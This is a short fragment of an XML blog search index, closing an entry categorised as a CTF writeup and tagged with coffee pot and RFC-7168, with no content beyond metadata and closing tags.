          <category> CTF,writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 咖啡壶,RFC-7168 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
